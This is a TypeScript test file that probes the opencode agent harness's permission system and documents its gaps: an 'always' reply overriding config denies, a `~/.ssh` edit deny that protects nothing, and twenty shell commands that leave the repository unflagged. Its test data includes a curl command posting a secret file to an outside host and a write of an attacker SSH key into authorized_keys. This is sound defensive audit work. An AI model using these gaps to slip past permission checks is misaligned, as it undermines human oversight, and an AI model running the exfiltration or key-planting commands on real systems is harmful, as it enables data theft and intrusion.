import fs from "node:fs";
import path from "node:path";

import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";

import {
  bash,
  installOpencode,
  probeConfig,
  probeRoot,
  settleProvider,
  sleep,
  startProbeServer,
  startProvider,
  waitFor,
  write,
  type FakeProvider,
  type ProbeServer,
} from "./opencode-probe-rig";

/**
 * MIN-362 — PERMISSIONS probe: what a “yes” covers, and what a `deny`
 * does not prevent.
 *
 * Does NOT run with `npm test`: `describe.skipIf` skips it as long as
 * `MDY_OPENCODE_PERMS_PROBE=1` is not set. It installs the binary (~140 MB)
 * and starts around fifteen servers — **no model is used**; a fake provider
 * scripts the tool calls ([opencode-probe-rig.ts](opencode-probe-rig.ts)).
 * It takes about four minutes on a Mac.
 *
 *   MDY_OPENCODE_PERMS_PROBE=1 npx vitest run \
 *     lib/server/agent/vm/opencode-permissions.probe.test.ts --testTimeout=900000
 *
 * # Reuse the installed binary on subsequent runs so we do not pay the 40-second
 * installation cost again:
 *   MDY_OPENCODE_BIN=/path/to/node_modules/.bin/opencode …
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * WHY THIS EXISTS
 *
 * A 2026-08-14 investigation surveyed eighteen unknowns with disposable
 * probes. A written report does not run again when
 * [opencode-version.ts](opencode-version.ts) is bumped, so this file preserves
 * the durable measurements as executable checks. What it preserves determines real
 * lines of code — the `case "external_directory"` in
 * [opencode-permissions.ts](opencode-permissions.ts), the supervisor's policy
 * for pending requests, and what an opt-in screen is allowed to PROMISE.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * STATEMENT OF 2026-08-15 on `opencode-ai@1.18.16`, and what it changes
 *
 * 1. `external_directory: "deny"` **short-circuits before publication**: nothing
 * reaches the request flow, and the tool returns an error. Our
 * "external_directory" case is therefore not a “second curtain”: it is DEAD.
 * 2. **Declaration order decides**, not `deny` priority: two otherwise identical
 * configs with the keys in opposite orders first refuse and then authorize the
 * same write. The LAST matching pattern wins.
 * 3. **A human “always” overwrites a config `deny`** (supporting witness:
 * the same `deny`, alone, refuses well). Session rules are concatenated
 * AFTER those in the config.
 * 4. **The pattern for an “always” on `edit` is `*`** — not a path. Only one
 * click silences all subsequent writes, including outside the repository.
 * On `bash`, it is by verb (`echo *`).
 * 5. **The “always” rule is kept in memory** and dies with the process. Because
 * the harness restarts opencode on every turn, an “always” rule lasts ONE TURN.
 * 6. **The grammar of the patterns is not the same depending on the permission**:
 * `edit` matches paths RELATIVE to the repository, without expansion of `~`;
 * `external_directory` matches ABSOLUTE folders, with `~` expanded. Hence
 * the hardest result of this probe: `edit: {"~/.ssh/*": "deny"}`
 * **doesn't protect anything at all**, and doesn't say it.
 * 7. **A bare `deny` removes the tool** from what the model is offered — but
 * `/experimental/tool` continues to list it. The catalog served to humans
 * and the one used in the model are not the same.
 * 8. **A session ruleset in `allow` is a real ACL** (new measurement):
 * it raises `ask` without cutting the toolset. In `deny`, it removes the tool.
 * 9. **The V2 system (`/api/permission/saved`) remains empty**: version
 * 1.18.16 does not use it, even for an “always” rule. The only native
 * persistence mechanism offered is not connected to anything.
 * 10. **Ten commands out of thirty** publish `external_directory`; twenty
 * publish only `bash`, and `cd .` / `popd` publish NOTHING.
 */

const LIVE = process.env.MDY_OPENCODE_PERMS_PROBE === "1";

/** The binary installation folder, shared by all measures. */
let installRoot = "";
let bin = "";
const running: ProbeServer[] = [];
const providers: FakeProvider[] = [];
const roots: string[] = [];

beforeAll(async () => {
  if (!LIVE) return;
  installRoot = probeRoot("install");
  roots.push(installRoot);
  bin = installOpencode(installRoot);
}, 600_000);

/**
 * ONE SERVER PER MEASUREMENT, AND NOT ONE MORE.
 *
 * Each `it` creates its own server. If they all remain alive until the end of
 * the file, about fifteen accumulate and the machine collapses — in one
 * measurement, the probe timed out after 300 seconds on a turn that takes
 * three seconds by itself. The servers survive until the end because that is
 * where we read what they wrote.
 */
afterEach(() => {
  for (const server of running.splice(0)) server.stop();
  for (const provider of providers.splice(0)) provider.close();
});

afterAll(() => {
  for (const root of roots) fs.rmSync(root, { recursive: true, force: true });
});

/** A complete setup: scripted provider, server, and fresh repository. */
async function boot(
  tag: string,
  turns: Parameters<typeof startProvider>[0],
  permission: Record<string, unknown>,
  extra: Record<string, unknown> = {},
): Promise<{ server: ProbeServer; provider: FakeProvider }> {
  const provider = await startProvider(turns);
  providers.push(provider);
  const server = await startProbeServer({
    bin,
    tag,
    config: probeConfig(provider.url, { permission, ...extra }),
  });
  running.push(server);
  roots.push(server.root);
  return { server, provider };
}

/** Plays a round and waits until the loop has stopped — on demand or at rest. */
async function playTurn(server: ProbeServer, sessionId: string, text = "go"): Promise<void> {
  const asksBefore = server.asks(sessionId).length;
  await server.prompt(sessionId, text);
  await waitFor(async () => {
    if (server.asks(sessionId).length > asksBefore) return true;
    const parts = server.toolParts();
    return server.sawIdle() || parts.some((p) => p.status === "error");
  }, 20_000);
  // A trick that doesn't stop at anything must still let its parts happen.
  await waitFor(() => server.toolParts().length > 0, 3_000);
}

describe.skipIf(!LIVE)("ce qu'une permission publie, et ce qu'elle ne publie pas", () => {
  it(
    "`external_directory: \"deny\"` ne publie RIEN — la branche du harness est morte",
    async () => {
      const { server } = await boot(
        "extdir-deny",
        [{ tools: [bash("cat /etc/hosts")] }],
        { bash: "allow", external_directory: "deny" },
      );
      const session = await server.createSession("deny");
      await playTurn(server, session);

      expect(
        server.asks().map((a) => a.permission),
        "un `deny` qui PUBLIE ferait du `case \"external_directory\"` un vrai second rideau",
      ).toEqual([]);
      expect(server.toolParts()).toEqual([
        expect.objectContaining({ tool: "bash", status: "error" }),
      ]);
      expect(server.toolParts()[0].error).toContain("rule which prevents you");
    },
    300_000,
  );

  it(
    "`external_directory: \"ask\"` publie un dossier ABSOLU, et son motif est le sous-arbre",
    async () => {
      const { server } = await boot(
        "extdir-ask",
        [{ tools: [bash("cat /etc/hosts")] }],
        { bash: "allow", external_directory: "ask" },
      );
      const session = await server.createSession("ask");
      await playTurn(server, session);

      const [ask] = server.asks();
      expect(ask, "aucune demande publiée").toBeTruthy();
      expect(ask.permission).toBe("external_directory");
      expect(ask.metadata.directories).toEqual(["/etc"]);
      expect(ask.metadata.command).toBe("cat /etc/hosts");
      // The kernel of a “yes” is the SUBTREE, not the requested file.
      expect(ask.patterns).toEqual(["/etc/*"]);
      expect(ask.always).toEqual(["/etc/*"]);
    },
    300_000,
  );
});

describe.skipIf(!LIVE)("qui gagne, entre deux règles", () => {
  it(
    "l'ORDRE DE DÉCLARATION décide — `deny` n'est pas prioritaire",
    async () => {
      const denyDernier = await boot(
        "ordre-deny-dernier",
        [{ tools: [bash("cat a.txt")] }],
        { bash: { "*": "allow", "cat *": "deny" } },
      );
      const allowDernier = await boot(
        "ordre-allow-dernier",
        [{ tools: [bash("cat a.txt")] }],
        { bash: { "cat *": "deny", "*": "allow" } },
      );

      for (const rig of [denyDernier, allowDernier]) {
        const session = await rig.server.createSession("ordre");
        await playTurn(rig.server, session);
      }
      await waitFor(() => allowDernier.server.toolParts()[0]?.status === "completed", 10_000);

      expect(
        denyDernier.server.toolParts()[0]?.status,
        "le `deny` déclaré EN DERNIER doit refuser",
      ).toBe("error");
      expect(
        allowDernier.server.toolParts()[0]?.status,
        "la MÊME paire de règles, dans l'autre ordre, autorise",
      ).toBe("completed");
    },
    300_000,
  );

  it(
    "un « toujours » humain ÉCRASE un `deny` de config — et le témoin prouve que le `deny` mordait",
    async () => {
      // Witness: `deny` alone, without any “always”, refuses writing.
      const temoin = await boot(
        "always-temoin",
        [{ tools: [] }],
        { bash: "allow", external_directory: "allow", edit: { "*": "ask", "vault/*": "deny" } },
      );
      fs.mkdirSync(path.join(temoin.server.repo, "vault"), { recursive: true });
      temoin.provider.queue.push(
        { tools: [write(path.join(temoin.server.repo, "vault", "v.txt"), "fuite\n")] },
        { text: "fini" },
      );
      const temoinSession = await temoin.server.createSession("témoin");
      await playTurn(temoin.server, temoinSession);
      expect(temoin.server.toolParts()[0]?.status, "le `deny` ne mord pas : la suite ne prouve rien").toBe(
        "error",
      );
      expect(fs.existsSync(path.join(temoin.server.repo, "vault", "v.txt"))).toBe(false);

      // The measurement: an “always” rule on a FIRST harmless write opens the
      // forbidden directory.
      const { server, provider } = await boot(
        "always-ecrase-deny",
        [],
        { bash: "allow", external_directory: "allow", edit: { "*": "ask", "vault/*": "deny" } },
      );
      fs.mkdirSync(path.join(server.repo, "vault"), { recursive: true });
      provider.queue.push(
        { tools: [write(path.join(server.repo, "note.txt"))] },
        { tools: [write(path.join(server.repo, "vault", "v.txt"), "fuite\n")] },
        { text: "fini" },
      );
      const session = await server.createSession("always");
      await playTurn(server, session);

      const [ask] = server.asks(session);
      expect(ask.permission).toBe("edit");
      // The proposed reason is not the file: it's EVERYTHING.
      expect(ask.always, "un « toujours » sur `edit` ne porte plus sur un chemin").toEqual(["*"]);
      expect(ask.patterns, "les motifs d'`edit` sont RELATIFS au dépôt").toEqual(["note.txt"]);

      await server.post(`/permission/${ask.id}/reply`, { reply: "always" });
      await waitFor(() => fs.existsSync(path.join(server.repo, "vault", "v.txt")), 20_000);

      expect(
        fs.existsSync(path.join(server.repo, "vault", "v.txt")),
        "le « toujours » de session ne lève plus le `deny` de config",
      ).toBe(true);
      expect(server.toolParts().every((p) => p.status === "completed")).toBe(true);
    },
    300_000,
  );

  it(
    "un « toujours » sur `bash` porte le VERBE, et meurt avec le process",
    async () => {
      const { server, provider } = await boot(
        "always-bash",
        [{ tools: [bash("echo un")] }, { tools: [bash("echo deux")] }, { tools: [bash("ls -la")] }],
        { bash: "ask" },
      );
      const session = await server.createSession("verbe");
      await playTurn(server, session);

      const [first] = server.asks(session);
      expect(first.always, "le motif d'un « toujours » sur bash").toEqual(["echo *"]);
      expect(first.patterns).toEqual(["echo un"]);

      await server.post(`/permission/${first.id}/reply`, { reply: "always" });
      // `echo deux` remains silent, `ls -la` asks again: the “yes” covers the verb.
      await waitFor(() => server.asks(session).length >= 2, 25_000);
      expect(
        server.asks(session).map((a) => a.metadata?.command),
        "un « toujours » sur `echo` a couvert autre chose que `echo`",
      ).toEqual(["echo un", "ls -la"]);

      // The native persistent store saw nothing.
      expect((await server.get("/api/permission/saved")).body).toEqual({ data: [] });

      // ── THE RESTART: the “always” does not survive the process ──────────
      server.stop();
      const restarted = await startProbeServer({
        bin,
        tag: "always-bash",
        config: probeConfig(provider.url, { permission: { bash: "ask" } }),
        reuse: { root: server.root, repo: server.repo },
      });
      running.push(restarted);
      provider.queue.push({ tools: [bash("echo trois")] }, { text: "fini" });
      await playTurn(restarted, session, "encore");

      expect(
        restarted.asks(session).map((a) => a.metadata?.command),
        "le « toujours » a survécu au redémarrage — le harness relance opencode à CHAQUE tour",
      ).toEqual(["echo trois"]);
    },
    300_000,
  );

  it(
    "un refus rejette TOUTES les demandes pendantes de la session",
    async () => {
      const { server } = await boot(
        "cascade",
        [{ tools: [bash("echo un"), bash("echo deux"), bash("echo trois")] }],
        { bash: "ask" },
      );
      const session = await server.createSession("cascade");
      await server.prompt(session);
      await waitFor(async () => ((await server.get("/permission")).body ?? []).length === 3, 20_000);

      const pending = (await server.get("/permission")).body as Array<Record<string, any>>;
      expect(
        pending.map((p) => p.metadata.command),
        "trois appels de tool dans un round, trois demandes SIMULTANÉES",
      ).toEqual(["echo un", "echo deux", "echo trois"]);

      await server.post(`/permission/${pending[0].id}/reply`, { reply: "reject", message: "non" });
      await waitFor(() => server.toolParts().filter((p) => p.status === "error").length === 3, 15_000);

      const errors = server.toolParts().map((p) => p.error);
      expect(errors.filter((e) => e.includes("with the following feedback: non")).length).toBe(1);
      expect(
        errors.filter((e) => e === "The user rejected permission to use this specific tool call.").length,
        "les deux autres tombent SANS avoir été refusées, et sans motif",
      ).toBe(2);
      expect(((await server.get("/permission")).body ?? []).length).toBe(0);
    },
    300_000,
  );
});

describe.skipIf(!LIVE)("la grammaire des motifs", () => {
  it(
    "`edit` matche du RELATIF au dépôt : ni chemin absolu, ni `~`",
    async () => {
      const relatif = await boot("motif-relatif", [], {
        bash: "allow",
        external_directory: "allow",
        edit: { "*": "ask", "../a/*": "allow" },
      });
      const absolu = await boot("motif-absolu", [], {
        bash: "allow",
        external_directory: "allow",
        edit: { "*": "ask", "@ABS@/*": "allow" },
      });
      const tilde = await boot("motif-tilde", [], {
        bash: "allow",
        external_directory: "allow",
        edit: { "*": "ask", "~/a/*": "allow" },
      });

      // The absolute reason must be written AFTER the fact: it depends on the file drawn.
      absolu.server.stop();
      const deepOf = (server: ProbeServer) => path.join(server.root, "a", "b", "c");
      const absoluServer = await startProbeServer({
        bin,
        tag: "motif-absolu",
        config: probeConfig(absolu.provider.url, {
          permission: {
            bash: "allow",
            external_directory: "allow",
            edit: { "*": "ask", [`${deepOf(absolu.server)}/*`]: "allow" },
          },
        }),
        reuse: { root: absolu.server.root, repo: absolu.server.repo },
      });
      running.push(absoluServer);

      const cases: Array<[string, ProbeServer, FakeProvider]> = [
        ["relatif", relatif.server, relatif.provider],
        ["absolu", absoluServer, absolu.provider],
        ["tilde", tilde.server, tilde.provider],
      ];
      for (const [, server, provider] of cases) {
        const deep = deepOf(server);
        fs.mkdirSync(deep, { recursive: true });
        provider.queue.push({ tools: [write(path.join(deep, "f.txt"))] }, { text: "fini" });
        const session = await server.createSession("motif");
        await playTurn(server, session);
      }

      const verdict = (server: ProbeServer) =>
        fs.existsSync(path.join(deepOf(server), "f.txt")) ? "autorisé" : "demandé";
      expect(verdict(relatif.server), "`../a/*` : `*` doit traverser les `/`").toBe("autorisé");
      expect(verdict(absoluServer), "un motif ABSOLU sur `edit` matcherait donc quelque chose").toBe(
        "demandé",
      );
      expect(verdict(tilde.server), "`~` serait donc expansé sur `edit`").toBe("demandé");
    },
    300_000,
  );

  it(
    "`edit: {\"~/.ssh/*\": \"deny\"}` NE PROTÈGE RIEN — et ne le dit pas",
    async () => {
      const { server, provider } = await boot("ssh-tilde", [], {
        bash: "allow",
        external_directory: "allow",
        edit: { "*": "allow", "~/.ssh/*": "deny" },
      });
      // `HOME` of the probe = its root: nothing is written in the real home.
      const ssh = path.join(server.root, ".ssh");
      fs.mkdirSync(ssh, { recursive: true });
      provider.queue.push(
        { tools: [write(path.join(ssh, "authorized_keys"), "ssh-ed25519 AAAA attaquant\n")] },
        { text: "fini" },
      );
      const session = await server.createSession("ssh");
      await playTurn(server, session);

      expect(
        fs.existsSync(path.join(ssh, "authorized_keys")),
        "bonne nouvelle : le `deny` en `~` mord enfin. Reprendre le §2 de l'audit.",
      ).toBe(true);
      expect(server.asks(session), "et il ne demande même pas").toEqual([]);

      // The SAME refusal, written in relation to the deposit, bites.
      const relatif = await boot("ssh-relatif", [], {
        bash: "allow",
        external_directory: "allow",
        edit: { "*": "allow", "../.ssh/*": "deny" },
      });
      const sshRel = path.join(relatif.server.root, ".ssh");
      fs.mkdirSync(sshRel, { recursive: true });
      relatif.provider.queue.push(
        { tools: [write(path.join(sshRel, "authorized_keys"), "ssh-ed25519 AAAA attaquant\n")] },
        { text: "fini" },
      );
      const sessionRel = await relatif.server.createSession("ssh-rel");
      await playTurn(relatif.server, sessionRel);
      expect(fs.existsSync(path.join(sshRel, "authorized_keys"))).toBe(false);
      expect(relatif.server.toolParts()[0]?.status).toBe("error");
    },
    300_000,
  );

  it(
    "`external_directory` matche de l'ABSOLU, avec `~` expansé et `*` qui traverse",
    async () => {
      const { server, provider } = await boot("extdir-tilde", [], {
        bash: "allow",
        external_directory: { "*": "ask", "~/*": "allow" },
      });
      const deep = path.join(server.root, "a", "b", "c");
      fs.mkdirSync(deep, { recursive: true });
      provider.queue.push({ tools: [bash(`cat ${path.join(deep, "nope.txt")}`)] }, { text: "fini" });
      const session = await server.createSession("extdir");
      await playTurn(server, session);

      expect(
        server.asks(session),
        "`~/*` n'a pas couvert un dossier trois niveaux plus bas",
      ).toEqual([]);
      expect(server.toolParts()[0]?.status).toBe("completed");
    },
    300_000,
  );
});

describe.skipIf(!LIVE)("le jeu de tools, et ce que le modèle en voit", () => {
  it(
    "un `deny` NU retire le tool de ce qui est offert au modèle — mais pas du catalogue REST",
    async () => {
      const ouvert = await boot("catalogue-ask", [{ text: "fini" }], {
        webfetch: "ask",
        todowrite: "ask",
      });
      const ferme = await boot("catalogue-deny", [{ text: "fini" }], {
        webfetch: "deny",
        todowrite: "deny",
      });

      for (const rig of [ouvert, ferme]) {
        const session = await rig.server.createSession("catalogue");
        await playTurn(rig.server, session);
      }

      expect(ouvert.provider.offeredTools()).toContain("webfetch");
      expect(ouvert.provider.offeredTools()).toContain("todowrite");
      expect(
        ferme.provider.offeredTools(),
        "un `deny` nu ne « refuse » pas le tool : il le fait DISPARAÎTRE",
      ).not.toContain("webfetch");
      expect(ferme.provider.offeredTools()).not.toContain("todowrite");

      // The REST catalog does not move: it is not what the model reads.
      const rest = await ferme.server.get("/experimental/tool?provider=probe&model=model&agent=build");
      const ids = ((Array.isArray(rest.body) ? rest.body : rest.body.data) as Array<{ id: string }>).map(
        (t) => t.id,
      );
      expect(ids, "`/experimental/tool` et le prompt du modèle ne disent PLUS la même chose").toContain(
        "webfetch",
      );
    },
    300_000,
  );

  it(
    "un ruleset de session en `allow` est une vraie ACL ; en `deny` il ampute",
    async () => {
      const permissif = await boot("ruleset-allow", [{ tools: [bash("echo ruleset")] }, { text: "fini" }], {
        bash: "ask",
        webfetch: "ask",
      });
      const restrictif = await boot("ruleset-deny", [{ tools: [bash("echo ruleset")] }, { text: "fini" }], {
        bash: "ask",
        webfetch: "ask",
      });

      const allowed = await permissif.server.createSession("allow", [
        { permission: "bash", pattern: "*", action: "allow" },
      ]);
      await playTurn(permissif.server, allowed);
      expect(
        permissif.server.asks(allowed),
        "le ruleset `allow` n'a pas levé l'`ask` de la config",
      ).toEqual([]);
      expect(permissif.server.toolParts()[0]?.status).toBe("completed");
      expect(
        permissif.provider.offeredTools(),
        "un `allow` de session ne doit RIEN retirer du jeu de tools",
      ).toContain("webfetch");

      const denied = await restrictif.server.createSession("deny", [
        { permission: "webfetch", pattern: "*", action: "deny" },
      ]);
      await playTurn(restrictif.server, denied);
      expect(
        restrictif.provider.offeredTools(),
        "un `deny` de session ampute le jeu de tools — ce n'est pas une ACL",
      ).not.toContain("webfetch");
    },
    300_000,
  );

  it(
    "le magasin V2 (`/api/permission/saved`) reste vide — les tools de 1.18.16 ne l'empruntent pas",
    async () => {
      const { server } = await boot(
        "v2",
        [{ tools: [bash("echo v2")] }, { text: "fini" }],
        { bash: "ask" },
      );
      const session = await server.createSession("v2");
      await playTurn(server, session);

      const [ask] = server.asks(session);
      // The V2 counterpart of the SAME request does not exist: the two systems
      // coexist without communicating.
      expect((await server.get(`/api/session/${session}/permission`)).body).toEqual({ data: [] });
      expect((await server.get("/api/permission/request")).body.data).toEqual([]);

      await server.post(`/permission/${ask.id}/reply`, { reply: "always" });
      await waitFor(() => server.sawIdle(), 15_000);

      expect(
        (await server.get("/api/permission/saved")).body,
        "le magasin V2 s'est rempli : la persistance native est peut-être branchée, reprendre §3.4 de l'audit",
      ).toEqual({ data: [] });
    },
    300_000,
  );
});

/**
 * THE ACTUAL COVERAGE OF `external_directory` ON THE SHELL SIDE.
 *
 * This is the central result of the audit (§2), and it determines what an
 * opt-in screen is allowed to promise: a card saying “the agent wants to leave
 * the folder” and connected only to `external_directory` would promise a false
 * guarantee. The twenty commands in the right column reach the disk without
 * publishing the `bash` permission — and `checkCommand` lets them pass because
 * it only targets git.
 */
const COMMANDES_QUI_PUBLIENT = ["cat", "cp", "mv", "rm", "mkdir", "touch", "chmod", "chown", "cd", "pushd"];
const COMMANDES_MUETTES = [
  "grep", "find", "sed", "head", "tail", "less", "awk", "wc", "python3", "node",
  "tar", "ssh", "curl", "open", "base64", "ln", "xargs", "dd", "rsync", "zip",
];
/** Neither `bash` nor `external_directory`: they do not pass in front of ANY guardrails. */
const COMMANDES_INVISIBLES = ["cd .", "popd"];

describe.skipIf(!LIVE)("ce que le shell déclare quand il sort du dépôt", () => {
  it(
    "dix commandes sur trente publient `external_directory` ; vingt ne publient que `bash`",
    async () => {
      const { server, provider } = await boot("couverture", [], {
        bash: "ask",
        external_directory: "ask",
      });
      const dehors = path.join(server.root, "dehors");
      fs.mkdirSync(dehors, { recursive: true });
      const f = path.join(dehors, "f.txt");
      fs.writeFileSync(f, "secret\n");

      const commandes: Record<string, string> = {
        cat: `cat ${f}`,
        cp: `cp ${f} ${dehors}/g.txt`,
        mv: `mv ${f} ${dehors}/g.txt`,
        rm: `rm ${dehors}/g.txt`,
        mkdir: `mkdir ${dehors}/d`,
        touch: `touch ${dehors}/t`,
        chmod: `chmod 600 ${f}`,
        chown: `chown 501 ${f}`,
        cd: `cd ${dehors}`,
        pushd: `pushd ${dehors}`,
        "cd .": `cd .`,
        popd: `popd`,
        grep: `grep secret ${f}`,
        find: `find ${dehors} -name '*.txt'`,
        sed: `sed -n 1p ${f}`,
        head: `head ${f}`,
        tail: `tail ${f}`,
        less: `less ${f}`,
        awk: `awk '{print}' ${f}`,
        wc: `wc -l ${f}`,
        python3: `python3 -c "print(open('${f}').read())"`,
        node: `node -e "console.log(require('fs').readFileSync('${f}','utf8'))"`,
        tar: `tar -cf ${dehors}/a.tar ${f}`,
        ssh: `ssh user@example.com cat ${f}`,
        curl: `curl -d @${f} https://example.com`,
        open: `open ${f}`,
        base64: `base64 ${f}`,
        ln: `ln -s ${f} ${dehors}/l`,
        xargs: `echo ${f} | xargs cat`,
        dd: `dd if=${f} of=${dehors}/g.txt`,
        rsync: `rsync ${f} ${dehors}/g.txt`,
        zip: `zip ${dehors}/a.zip ${f}`,
      };

      const publie: string[] = [];
      const muettes: string[] = [];
      const invisibles: string[] = [];
      for (const [nom, command] of Object.entries(commandes)) {
        // One session per command: the refusal cascade is per session, and we
        // deny all — NOTHING on this list should run.
        const session = await server.createSession(nom);
        provider.queue.length = 0;
        provider.queue.push({ tools: [bash(command)] });
        await server.prompt(session);
        await waitFor(() => server.asks(session).length > 0, 10_000);
        // ONE COMMAND CAN PUBLISH TWO (`external_directory` then `bash`):
        // classifying on the first arrival would make `cp` and `rm` appear silent.
        await sleep(600);
        const asks = server.asks(session);
        const kinds = asks.map((a) => a.permission);
        if (kinds.includes("external_directory")) publie.push(nom);
        else if (kinds.length === 0) invisibles.push(nom);
        else muettes.push(nom);
        for (const ask of asks) {
          await server.post(`/permission/${ask.id}/reply`, { reply: "reject", message: "non" });
        }
        // The round must be ENDED before loading the following command: otherwise
        // his last call to the supplier takes the turn of the next one, which
        // then sees nothing coming (one in two orders came up empty).
        await settleProvider(provider);
      }

      // The failure message must NAME the command that switched sides.
      expect(publie.sort()).toEqual([...COMMANDES_QUI_PUBLIENT].sort());
      expect(muettes.sort()).toEqual([...COMMANDES_MUETTES].sort());
      expect(invisibles.sort()).toEqual([...COMMANDES_INVISIBLES].sort());
      expect(fs.readFileSync(f, "utf8"), "une commande refusée s'est exécutée").toBe("secret\n");
    },
    600_000,
  );
});
